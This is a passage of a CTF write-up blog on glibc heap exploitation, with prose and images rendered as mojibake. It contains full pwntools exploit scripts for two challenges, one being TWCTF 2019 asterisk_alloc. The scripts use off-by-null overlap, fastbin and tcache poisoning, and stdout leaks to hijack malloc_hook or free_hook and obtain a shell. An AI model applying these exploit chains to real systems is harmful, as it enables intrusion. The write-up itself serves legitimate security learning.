class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">file._lock=libc_base+<span class="number">0x3c6780</span><span class="comment">#ç¡®ä¿è¿™ä¸ª_lockå­—æ®µçš„å€¼æ˜¯æ­£å¸¸çš„</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,<span class="built_in">bytes</span>(file))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220826112921840-1751167110.png"></p><h4 id="æ€è·¯äºŒï¼šåˆ©ç”¨off-by-null"><a href="#æ€è·¯äºŒï¼šåˆ©ç”¨off-by-null" class="headerlink" title="æ€è·¯äºŒï¼šåˆ©ç”¨off_by_null"></a>æ€è·¯äºŒï¼šåˆ©ç”¨off_by_null</h4><p>è¿™ä¸ªæ€è·¯æ¯”è¾ƒå¸¸è§„ï¼Œä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚</p><p>ä¸»è¦æ˜¯é€šè¿‡ä¸¤æ¬¡off by nullé€ æˆä¸¤æ¬¡å †å—é‡å ï¼Œç„¶åå°†unsorted binä¸­çš„fdæŒ‡é’ˆå†™å…¥fastbinä¸­çš„fdä½ç½®ã€‚ç„¶åæ‰“fastbin attackè¿›è¡Œio leakã€‚æœ€åå†æ‰“fastbin attackå¾€malloc_hookä¸­å†™å…¥one_gadgetã€‚</p><p>æ•´ä½“æ¥è¯´æœ€éº»çƒ¦çš„éƒ¨åˆ†å°±æ˜¯å°†unsorted binä¸­çš„fdæŒ‡é’ˆå†™å…¥fastbinä¸­çš„fdä½ç½®ã€‚</p><p>è¿™é‡Œçš„å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><blockquote><p><strong>åˆ©ç”¨off by one(null)å…ˆæ‰“ä¸€ä¸ªå †å—é‡å ï¼Œç„¶ååœ¨bssæ®µä¸Šç•™ä¸‹ä¸¤ä¸ªspy chunkçš„åœ°å€</strong>ï¼Œå°†å…¶ä¸­ä¸€ä¸ªé‡Šæ”¾æ‰è¿›å…¥fast binä¸­ï¼Œé‚£ä¹ˆæ­¤æ—¶bssæ®µä¸Šè¿˜æœ‰ä¸€ä¸ªspy chunkçš„åœ°å€ã€‚ä½†æ­¤æ—¶çš„unsorted binçš„åœ°å€å·²ç»ä½äºäº†spy chunkçš„åœ°å€ï¼Œé‚£å°±å°†unsorted binä¸­çš„å †å—éƒ½ç”³è¯·å›æ¥ã€‚ç„¶åå†æ¬¡åˆ©ç”¨off by one(null)åšä¸€ä¸ªå †å—é‡å ï¼Œè¿™æ¬¡<strong>å°†merged chunkç”³è¯·å›æ¥åï¼Œunsorted binçš„fdæŒ‡é’ˆå°±è‡ªç„¶è½åˆ°äº†spy chunkçš„fdæŒ‡é’ˆä¸Š(åˆ«å¿˜äº†æ­¤æ—¶è¿™ä¸ªå †å—ä¹Ÿä½äºfastbinä¸­)ï¼Œè¿™æ ·unsorted binä¸­çš„fdæŒ‡é’ˆå°±è½åˆ°äº†fast binä¸­</strong>ï¼ŒåŒæ—¶bssæ®µä¸Šä»ç„¶å­˜åœ¨ä¸€ä¸ªspy chunkçš„åœ°å€ï¼Œè¿™æ ·ç¼–è¾‘è¯¥å †å—å°±å¯ä»¥æ§åˆ¶unsorted binä¸­çš„fdæŒ‡é’ˆï¼Œæ­¤æ—¶çš„sizeæ˜¯unsorted binèŒƒå›´é‡Œçš„å¤§size(æ— æ³•ç›´æ¥å°†å…¶ç”³è¯·å‡ºæ¥)ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”è¯¥å»å°†merged chunké‡Šæ”¾æ‰ï¼Œç„¶åunsorted binå‘ä¸Šåˆå¹¶(å‘ä½åœ°å€åˆå¹¶)ï¼Œè€ŒåŸæœ¬spy chunkçš„fdå¹¶ä¸ä¼šæ¶ˆå¤±ï¼Œç„¶åå†æ¬¡ç”³è¯·ä¸€ä¸ªlen(merged chunk)+0x10+2 å¤§å°çš„chunkï¼Œè¿™æ ·å¾€è¿™ä¸ªæ–°chunkå†™å…¥æ•°æ®çš„æ—¶å€™ï¼Œå°±å¯ä»¥æ§åˆ¶spy chunkçš„sizeï¼Œé¡ºä¾¿è¿˜èƒ½æŠŠspy chunkçš„fd(ä¹Ÿå°±æ˜¯main_arena+88)çš„åä¸¤å­—èŠ‚ç»™ä¿®æ”¹åˆ°stdoutç»“æ„ä½“ä¸Šæ–¹ã€‚</p></blockquote><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#merge succeeded</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0x100,&#x27;a&#x27;)</span></span><br><span class="line"> </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xB64)   </span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add((<span class="number">0x80</span>+<span class="number">0x10</span>+<span class="number">2</span>),p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x59</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x60&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c56a4</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">3</span>)+libc_base</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29269</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220826111533151-552713986.png"></p><h2 id="TWCTF-online-2019-asterisk-alloc"><a href="#TWCTF-online-2019-asterisk-alloc" class="headerlink" title="TWCTF_online_2019_asterisk_alloc"></a>TWCTF_online_2019_asterisk_alloc</h2><h3 id="æ”¶è·ä¸æ€»ç»“ï¼š"><a href="#æ”¶è·ä¸æ€»ç»“ï¼š" class="headerlink" title="æ”¶è·ä¸æ€»ç»“ï¼š"></a>æ”¶è·ä¸æ€»ç»“ï¼š</h3><p>è¿™é“é¢˜ä¸»è¦å°±æ˜¯reallocå‡½æ•°çš„å¦™ç”¨ï¼Œå­¦åˆ°äº†å…³äºè¿™ä¸ªå‡½æ•°å¾ˆå¤šæ–°çŸ¥è¯†ã€‚è¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®å‚æ•°çš„ä¸åŒæ¥å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œå…·ä½“æƒ…å†µå¦‚ä¸‹ï¼š</p><blockquote><p>realloc(ptr,size)å‡½æ•°</p><p>å½“sizeä¸åˆæ³•ï¼Œæ¯”å¦‚-1æ—¶ï¼Œreallocå‡½æ•°å°±ä¼šè¿”å›NULLã€‚</p><p>å½“sizeä¸º0ä¸”ptrå­˜åœ¨æ—¶ï¼Œå°±ä¼šæ‰§è¡Œfree(ptr)ä¸”è¿”å›NULL</p><p>å½“sizeæ­£å¸¸ä¸”pträ¸å­˜åœ¨æ—¶ï¼Œå°±ä¼šæ‰§è¡Œmalloc(ptr)</p><p>å½“sizeæ­£å¸¸ä¸”ptrå­˜åœ¨æ—¶ï¼Œè¿™å°±æ¶‰åŠåˆ°äº†ä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æ˜¯sizeå¤§äºäº†ptræŒ‡å‘å †å—çš„sizeï¼Œè¿™ç§æƒ…å†µå…ˆåˆ¤æ–­ptræŒ‡å‘çš„å †å—èƒ½å¦ä¸top chunkæˆ–è€…ä½äºé«˜åœ°å€ä¸”freeçŠ¶æ€çš„å †å—åˆå¹¶ï¼Œå¦‚æœåˆå¹¶åäºŒè€…å¤§å°æ»¡è¶³sizeåˆ™è¿›è¡Œåˆå¹¶ã€‚å¦‚æœä¸èƒ½åˆå¹¶çš„è¯å†å»ç”³è¯·ä¸€å—æ–°çš„å†…å­˜ï¼Œå°†åŸæ¥çš„æ•°æ®æ‹·è´è¿‡æ¥ï¼Œå†é‡Šæ”¾ä¹‹å‰çš„å †å—ã€‚ç¬¬äºŒç§æ˜¯sizeå°äºäº†ptræŒ‡å‘å †å—çš„sizeï¼Œè¿™ç§æƒ…å†µä¼šç•™ä¸‹sizeå¤§å°çš„å †å—ï¼Œå°†å‰©ä½™éƒ¨åˆ†çš„å †å—ç»™é‡Šæ”¾æ‰ã€‚</p></blockquote><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-2"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/2706180-20220826113015547-280603116.png"></p><h3 id="æ¼æ´åˆ†æï¼š-1"><a href="#æ¼æ´åˆ†æï¼š-1" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p><img src="/../img/2706180-20220826113031894-2049890680.png"></p><p>freeçš„æ—¶å€™æ²¡æœ‰å°†æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨UAFæ¼æ´ã€‚å½“UAFé…ä¸Š2.27-3ubuntu1è¿™ä¸ªç‰ˆæœ¬ï¼Œå®åœ¨æ˜¯èˆ’æœè‡³æï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨tcache dupã€‚åŒæ—¶è¿™é“é¢˜ä¿æŠ¤ä¸ºFULL RELROè¿˜æ²¡æœ‰æ‰“å°å‡½æ•°ï¼Œé‚£å°±å¯ä»¥åŸºæœ¬ç¡®å®šæ‰“IO leakäº†ã€‚</p><h3 id="ç¨‹åºç®€å•åˆ†æï¼š"><a href="#ç¨‹åºç®€å•åˆ†æï¼š" class="headerlink" title="ç¨‹åºç®€å•åˆ†æï¼š"></a>ç¨‹åºç®€å•åˆ†æï¼š</h3><p>è¿™é“é¢˜æœ‰ä¸€ç‚¹ç‚¹ç‰¹æ®Šï¼Œæ²¡æœ‰editå‡½æ•°æ²¡æœ‰showå‡½æ•°ã€‚ä½†æ˜¯addå‡½æ•°é‡Œå­˜åœ¨ä¸‰ä¸ªç”³è¯·å†…å­˜çš„å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯malloc calloc reallocå‡½æ•°ã€‚é€šè¿‡è§‚å¯Ÿaddå’Œdeleteå‡½æ•°çš„ä»£ç ï¼Œå‘ç°mallocå’Œcallocå‡½æ•°åªèƒ½ç”¨ä¸€æ¬¡ï¼Œå› æ­¤è¿™é“é¢˜åªèƒ½å°†ç›®å…‰æ”¾åˆ°reallocå‡½æ•°ä¸Šã€‚reallocå‡½æ•°å¯¹äºå‚æ•°çš„ä¸åŒï¼Œè‡ªèº«ä¹Ÿæœ‰å¾ˆå¤šä¸åŒçš„åŠŸèƒ½ï¼ˆæ–‡ç« å¼€å§‹å·²ç»è¯´æ˜äº†ï¼‰</p><p>è¿™é“é¢˜çš„æ ¸å¿ƒç‚¹å¹¶ä¸æ˜¯åœ¨äºæ€ä¹ˆå°†unsorted binä¸­çš„fdæŒ‡é’ˆç»™å¼„åˆ°tcachebinä¸Šï¼Œè¿™ä¸€ç‚¹æœ‰å¥½å‡ ç§æ–¹æ³•éƒ½å¯ä»¥ï¼Œéš¾ç‚¹æ˜¯ä¸å¤ªå¥½ç¼–è¾‘è¿™ä¸ªunsorted binä¸­çš„fdæŒ‡é’ˆã€‚è¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯ç”³è¯·ä¸€ä¸ªå¤§å †å—Aï¼Œç„¶åå†ç”¨reallocå‡½æ•°ç”³è¯·ä¸€ä¸ªå°å †å—B(è¦ä¿è¯A_size-B_size&gt;0x80,è®©å…¶æ»¡è¶³é‡Šæ”¾åå¯ä»¥è¿›å…¥unsorted binçš„å¤§å°)ï¼Œç”±äºå †å—Bçš„sizeå°äºAï¼Œè¿™æ ·å°±ä¿ç•™å †å—Bå¤§å°çš„sizeï¼Œå°†å †å—Açš„å‰©ä½™éƒ¨åˆ†(å †å—C)é‡Šæ”¾æ‰ã€‚ç„¶åé‡Šæ”¾å…«æ¬¡å †å—Cï¼Œè¿™æ ·Cå°±è¿›å…¥äº†unsorted binä¸­ï¼Œç„¶åæˆ‘ä»¬æ‰§è¡Œrealloc(ptr_B,sizeof(å †å—A))ï¼Œæ­¤æ—¶çš„æ•ˆæœå°±æ˜¯å°†å †å—Cç”³è¯·å›æ¥ä¸å †å—Båˆå¹¶æˆä¸ºäº†å †å—Aï¼Œè€Œæˆ‘ä»¬çš„æ•°æ®å°±å¯ä»¥å»æ­£å¸¸ç¼–è¾‘åŸæœ¬å †å—Cçš„unsorted binçš„fdæŒ‡é’ˆäº†ã€‚</p><p>å‰©ä¸‹å°±æ˜¯å¸¸è§„æ“ä½œæ‰“ä¸€ä¸ªtcache dup+poisoningå°†free_hookç”³è¯·å‡ºæ¥æœ€åé‡Šæ”¾æ‰å­˜æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„å †å—äº†ã€‚</p><p>æ•´ä¸ªè¿‡ç¨‹å°±åœ¨äºä¸€ä¸ªreallocå‡½æ•°çš„å¦™ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬è¦ä¸æ–­çš„æ”¹å˜å¹¶æ§åˆ¶ptr_ré‚£ä¸ªå€¼ï¼Œæ‰€ä»¥ç»å¸¸ç©¿æ’å°†å…¶sizeè®¾ç½®ä¸º0æˆ–è€…-1ã€‚</p><h3 id="è°ƒè¯•è¿‡ç¨‹ï¼š"><a href="#è°ƒè¯•è¿‡ç¨‹ï¼š" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹ï¼š"></a>è°ƒè¯•è¿‡ç¨‹ï¼š</h3><p>ä¸‹å›¾ä¸ºfreeæ‰ä¸€ä¸ªå †å—å…«æ¬¡ï¼Œç„¶åunsorted binä¸­çš„fdæŒ‡é’ˆå°±å‡ºç°åˆ°äº†tcachebinä¸­</p><p><img src="/../img/2706180-20220826113058600-240750503.png"></p><p>è¿™éƒ¨åˆ†çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)<span class="comment">#è¿™æ˜¯å¤§å †å—</span></span><br><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#æ‰§è¡Œå®Œè¿™è¡Œä»£ç ï¼Œä¸Šé¢çš„è¿™ä¸ªå¤§å †å—å°±å˜æˆäº†0x50çš„å¯ç”¨å †å—å’Œ0xc0çš„freeçŠ¶æ€å †å—</span></span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#ä¸è¿‡åœ¨è¿™æ­¥çš„æ—¶å€™0x50è¿™ä¸ªå †å—ä¹Ÿè¢«é‡Šæ”¾äº†</span></span><br><span class="line">add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬è¦å…ˆæ§åˆ¶ptr_rçš„å€¼ä¸º0x50å †å—çš„é‚£ä¸ªåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå°†å…¶ç”³è¯·å›æ¥ï¼Œç„¶åæˆ‘ä»¬å†ç”³è¯·0x100è¿™ä¸ªå¤§å †å—ï¼Œè¿™æ ·reallocå‡½æ•°å°±ä¼šå‘ä¸‹åˆå¹¶(å‘é«˜åœ°å€åˆå¹¶)ã€‚</p><p><img src="/../img/2706180-20220826113121671-909787527.png"><br><img src="/../img/2706180-20220826113129858-1012521380.png"></p><p>å› ä¸ºåˆå¹¶åå¯ä»¥å†™å…¥0x100çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ§åˆ¶å †å—çš„fdæŒ‡é’ˆï¼Œå°†å…¶æ”¹ä¸ºstdoutç»“æ„ä½“åœ°å€ã€‚</p><p>è¿™æ­¥çš„expä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå‰©ä¸‹çš„éƒ¨åˆ†å°±æ˜¯å¸¸è§„æ“ä½œçš„tcache dup+tcache poisoningäº†ã€‚<strong>è¦æ³¨æ„çš„æ˜¯éœ€è¦ç©¿æ’realloc(ptr_r,-1)æ¥æ§åˆ¶ptr_rä¸ºç©ºï¼Œå†è¿›è¡Œreallocæ—¶æ‰æ˜¯mallocå‡½æ•°ã€‚å¦åˆ™æ— æ³•æ­£å¸¸å®Œæˆtcache poisoningã€‚</strong></p><p>å‰©ä¸‹è¿™éƒ¨åˆ†expä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æœ€åæ”¾ä¸€ä¸‹å®Œæ•´çš„exp<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_m</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_c</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_r</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">Which</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>, <span class="built_in">str</span>(Which))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span 